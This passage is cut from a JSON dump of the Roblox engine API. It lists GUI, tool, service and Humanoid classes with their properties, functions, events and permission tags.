lignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextBox"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextBox"},{"ReturnType":"void","Arguments":[],"Name":"CaptureFocus","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFocused","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReleaseFocus","tags":[],"Class":"TextBox","type":"Function"},{"Arguments":[{"Name":"enterPressed","Type":"bool"},{"Name":"inputThatCausedFocusLoss","Type":"Instance"}],"Name":"FocusLost","tags":[],"Class":"TextBox","type":"Event"},{"Arguments":[],"Name":"Focused","tags":[],"Class":"TextBox","type":"Event"},{"Superclass":"GuiBase2d","type":"Class","Name":"LayerCollector","tags":[]},{"Superclass":"LayerCollector","type":"Class","Name":"BillboardGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"BillboardGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"ExtentsOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Object","type":"Property","Name":"PlayerToHideFrom","tags":[],"Class":"BillboardGui"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector2","type":"Property","Name":"SizeOffset","tags":[],"Class":"BillboardGui"},{"ValueType":"Vector3","type":"Property","Name":"StudsOffset","tags":[],"Class":"BillboardGui"},{"Superclass":"LayerCollector","type":"Class","Name":"ScreenGui","tags":[]},{"Superclass":"ScreenGui","type":"Class","Name":"GuiMain","tags":["deprecated"]},{"Superclass":"LayerCollector","type":"Class","Name":"SurfaceGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"SurfaceGui"},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"SurfaceGui"},{"ValueType":"Vector2","type":"Property","Name":"CanvasSize","tags":[],"Class":"SurfaceGui"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SurfaceGui"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceGui"},{"ValueType":"float","type":"Property","Name":"ToolPunchThroughDistance","tags":[],"Class":"SurfaceGui"},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase3d","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Color","tags":["deprecated","hidden"],"Class":"GuiBase3d"},{"ValueType":"Color3","type":"Property","Name":"Color3","tags":[],"Class":"GuiBase3d"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"GuiBase3d"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiBase3d"},{"Superclass":"GuiBase3d","type":"Class","Name":"FloorWire","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"From","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":[],"Class":"FloorWire"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"FloorWire"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":[],"Class":"FloorWire"},{"ValueType":"Object","type":"Property","Name":"To","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"FloorWire"},{"ValueType":"float","type":"Property","Name":"WireRadius","tags":[],"Class":"FloorWire"},{"Superclass":"GuiBase3d","type":"Class","Name":"PVAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PVAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"HandleAdornment","tags":[]},{"ValueType":"bool","type":"Property","Name":"AlwaysOnTop","tags":[],"Class":"HandleAdornment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"HandleAdornment"},{"ValueType":"Vector3","type":"Property","Name":"SizeRelativeOffset","tags":[],"Class":"HandleAdornment"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"HandleAdornment"},{"Arguments":[],"Name":"MouseButton1Down","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseButton1Up","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseEnter","tags":[],"Class":"HandleAdornment","type":"Event"},{"Arguments":[],"Name":"MouseLeave","tags":[],"Class":"HandleAdornment","type":"Event"},{"Superclass":"HandleAdornment","type":"Class","Name":"BoxHandleAdornment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BoxHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ConeHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"ConeHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"ConeHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"CylinderHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Height","tags":[],"Class":"CylinderHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"CylinderHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"ImageHandleAdornment","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageHandleAdornment"},{"ValueType":"Vector2","type":"Property","Name":"Size","tags":[],"Class":"ImageHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"LineHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"LineHandleAdornment"},{"ValueType":"float","type":"Property","Name":"Thickness","tags":[],"Class":"LineHandleAdornment"},{"Superclass":"HandleAdornment","type":"Class","Name":"SphereHandleAdornment","tags":[]},{"ValueType":"float","type":"Property","Name":"Radius","tags":[],"Class":"SphereHandleAdornment"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionBox","tags":[]},{"ValueType":"float","type":"Property","Name":"LineThickness","tags":[],"Class":"SelectionBox"},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionBox"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionBox"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionBox"},{"Superclass":"PVAdornment","type":"Class","Name":"SelectionSphere","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"SurfaceColor","tags":["deprecated","hidden"],"Class":"SelectionSphere"},{"ValueType":"Color3","type":"Property","Name":"SurfaceColor3","tags":[],"Class":"SelectionSphere"},{"ValueType":"float","type":"Property","Name":"SurfaceTransparency","tags":[],"Class":"SelectionSphere"},{"Superclass":"GuiBase3d","type":"Class","Name":"PartAdornment","tags":[]},{"ValueType":"Object","type":"Property","Name":"Adornee","tags":[],"Class":"PartAdornment"},{"Superclass":"PartAdornment","type":"Class","Name":"HandlesBase","tags":[]},{"Superclass":"HandlesBase","type":"Class","Name":"ArcHandles","tags":[]},{"ValueType":"Axes","type":"Property","Name":"Axes","tags":[],"Class":"ArcHandles"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Down","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseButton1Up","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"},{"Name":"relativeAngle","Type":"float"},{"Name":"deltaRadius","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseEnter","tags":[],"Class":"ArcHandles","type":"Event"},{"Arguments":[{"Name":"axis","Type":"Axis"}],"Name":"MouseLeave","tags":[],"Class":"ArcHandles","type":"Event"},{"Superclass":"HandlesBase","type":"Class","Name":"Handles","tags":[]},{"ValueType":"Faces","type":"Property","Name":"Faces","tags":[],"Class":"Handles"},{"ValueType":"HandlesStyle","type":"Property","Name":"Style","tags":[],"Class":"Handles"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Down","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseButton1Up","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"},{"Name":"distance","Type":"float"}],"Name":"MouseDrag","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseEnter","tags":[],"Class":"Handles","type":"Event"},{"Arguments":[{"Name":"face","Type":"NormalId"}],"Name":"MouseLeave","tags":[],"Class":"Handles","type":"Event"},{"Superclass":"PartAdornment","type":"Class","Name":"SurfaceSelection","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"TargetSurface","tags":[],"Class":"SurfaceSelection"},{"Superclass":"GuiBase3d","type":"Class","Name":"SelectionLasso","tags":[]},{"ValueType":"Object","type":"Property","Name":"Humanoid","tags":[],"Class":"SelectionLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPartLasso","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Part","tags":[],"Class":"SelectionPartLasso"},{"Superclass":"SelectionLasso","type":"Class","Name":"SelectionPointLasso","tags":["deprecated"]},{"ValueType":"Vector3","type":"Property","Name":"Point","tags":[],"Class":"SelectionPointLasso"},{"Superclass":"GuiBase3d","type":"Class","Name":"TextureTrail","tags":["deprecated"]},{"ValueType":"float","type":"Property","Name":"CycleOffset","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"From","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"StudsBetweenTextures","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Vector2","type":"Property","Name":"TextureSize","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"Object","type":"Property","Name":"To","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":["RobloxPlaceSecurity"],"Class":"TextureTrail"},{"Superclass":"Instance","type":"Class","Name":"GuiItem","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"Backpack","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"BackpackItem","tags":[]},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"BackpackItem"},{"Superclass":"BackpackItem","type":"Class","Name":"HopperBin","tags":["deprecated"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"HopperBin"},{"ValueType":"BinType","type":"Property","Name":"BinType","tags":[],"Class":"HopperBin"},{"ReturnType":"void","Arguments":[],"Name":"Disable","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleSelect","tags":["RobloxScriptSecurity"],"Class":"HopperBin","type":"Function"},{"Arguments":[],"Name":"Deselected","tags":[],"Class":"HopperBin","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Selected","tags":[],"Class":"HopperBin","type":"Event"},{"Superclass":"BackpackItem","type":"Class","Name":"Tool","tags":[]},{"ValueType":"bool","type":"Property","Name":"CanBeDropped","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Tool"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Grip","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripForward","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripPos","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripRight","tags":[],"Class":"Tool"},{"ValueType":"Vector3","type":"Property","Name":"GripUp","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"ManualActivationOnly","tags":[],"Class":"Tool"},{"ValueType":"bool","type":"Property","Name":"RequiresHandle","tags":[],"Class":"Tool"},{"ValueType":"string","type":"Property","Name":"ToolTip","tags":[],"Class":"Tool"},{"ReturnType":"void","Arguments":[],"Name":"Activate","tags":[],"Class":"Tool","type":"Function"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"Tool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"Tool","type":"Event"},{"Superclass":"Tool","type":"Class","Name":"Flag","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Flag"},{"Superclass":"GuiItem","type":"Class","Name":"ButtonBindingWidget","tags":[]},{"Superclass":"GuiItem","type":"Class","Name":"GuiRoot","tags":["notCreatable"]},{"Superclass":"GuiItem","type":"Class","Name":"Hopper","tags":["deprecated"]},{"Superclass":"GuiItem","type":"Class","Name":"StarterPack","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GuiService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AutoSelectGuiEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"CoreGuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"GuiNavigationEnabled","tags":[],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsModalDialog","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"IsWindows","tags":["deprecated","readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"MenuIsOpen","tags":["readonly"],"Class":"GuiService"},{"ValueType":"bool","type":"Property","Name":"ScreenGuiEnabled","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedCoreObject","tags":["RobloxScriptSecurity"],"Class":"GuiService"},{"ValueType":"Object","type":"Property","Name":"SelectedObject","tags":[],"Class":"GuiService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null},{"Type":"CenterDialogType","Name":"centerDialogType","Default":null},{"Type":"Function","Name":"showFunction","Default":null},{"Type":"Function","Name":"hideFunction","Default":null}],"Name":"AddCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Instance","Name":"selectionParent","Default":null}],"Name":"AddSelectionParent","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null},{"Type":"Tuple","Name":"selections","Default":null}],"Name":"AddSelectionTuple","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"AddSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetBrickCount","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"GetClosestDialogToPosition","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetErrorMessage","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetUiMessage","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsTenFootInterface","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenBrowserWindow","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"dialog","Default":null}],"Name":"RemoveCenterDialog","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"RemoveKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"selectionName","Default":null}],"Name":"RemoveSelectionGroup","tags":[],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"SpecialKey","Name":"key","Default":null}],"Name":"RemoveSpecialKey","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"errorMessage","Default":null}],"Name":"SetErrorMessage","tags":["LocalUserSecurity","deprecated"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x1","Default":null},{"Type":"int","Name":"y1","Default":null},{"Type":"int","Name":"x2","Default":null},{"Type":"int","Name":"y2","Default":null}],"Name":"SetGlobalGuiInset","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"open","Default":null}],"Name":"SetMenuIsOpen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UiMessageType","Name":"msgType","Default":null},{"Type":"string","Name":"uiMessage","Default":null}],"Name":"SetUiMessage","tags":["LocalUserSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"ShowStatsBasedOnInputString","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleFullscreen","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Function"},{"ReturnType":"Vector2","Arguments":[],"Name":"GetScreenResolution","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"YieldFunction"},{"Arguments":[],"Name":"BrowserWindowClosed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"newErrorMessage","Type":"string"}],"Name":"ErrorMessageChanged","tags":["RobloxScriptSecurity","deprecated"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"EscapeKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"string"},{"Name":"modifiers","Type":"string"}],"Name":"KeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuClosed","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuOpened","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"ShowLeaveConfirmation","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"SpecialKey"},{"Name":"modifiers","Type":"string"}],"Name":"SpecialKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"msgType","Type":"UiMessageType"},{"Name":"newUiMessage","Type":"string"}],"Name":"UiMessageChanged","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"ReturnType":"void","Arguments":[{"Name":"title","Type":"string"},{"Name":"text","Type":"string"}],"Name":"SendCoreUiNotification","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"GuidRegistryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"HapticService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"GetMotor","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"IsMotorSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null}],"Name":"IsVibrationSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null},{"Type":"Tuple","Name":"vibrationValues","Default":null}],"Name":"SetMotor","tags":[],"Class":"HapticService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"HttpRbxApiService","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"}],"Name":"GetAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"}],"Name":"PostAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"HttpService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"HttpEnabled","tags":["LocalUserSecurity"],"Class":"HttpService"},{"ReturnType":"string","Arguments":[{"Type":"bool","Name":"wrapInCurlyBraces","Default":"true"}],"Name":"GenerateGUID","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"JSONDecode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"Variant","Name":"input","Default":null}],"Name":"JSONEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"UrlEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"nocache","Default":"false"}],"Name":"GetAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"},{"Type":"bool","Name":"compress","Default":"false"}],"Name":"PostAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Humanoid","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"AutoRotate","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"CameraOffset","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidDisplayDistanceType","type":"Property","Name":"DisplayDistanceType","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"Health","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HipHeight","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Jump","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"JumpPower","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"LeftLeg","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxHealth","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxSlopeAngle","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"MoveDirection","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"NameOcclusion","type":"Property","Name":"NameOcclusion","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"PlatformStand","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidRigType","type":"Property","Name":"RigType","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"RightLeg","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"SeatPart","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Sit","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"TargetPoint","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"Torso","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"WalkSpeed","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"WalkToPart","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"WalkToPoint","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"maxHealth","tags":["deprecated"],"Class":"Humanoid"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"AddCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"AddStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":"None"}],"Name":"ChangeState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"tool","Default":null}],"Name":"EquipTool","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"HumanoidStateType","Arguments":[],"Name":"GetState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null}],"Name":"GetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStatuses","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"HasCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"HasStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"moveDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null},{"Type":"Instance","Name":"part","Default":"nil"}],"Name":"MoveTo","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"RemoveCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"RemoveStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetClickToWalkEnabled","tags":["RobloxScriptSecurity"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"TakeDamage","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnequipTools","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"loadAnimation","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"takeDamage","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Climbing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[],"Name":"Died","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FallingDown","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FreeFalling","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"ac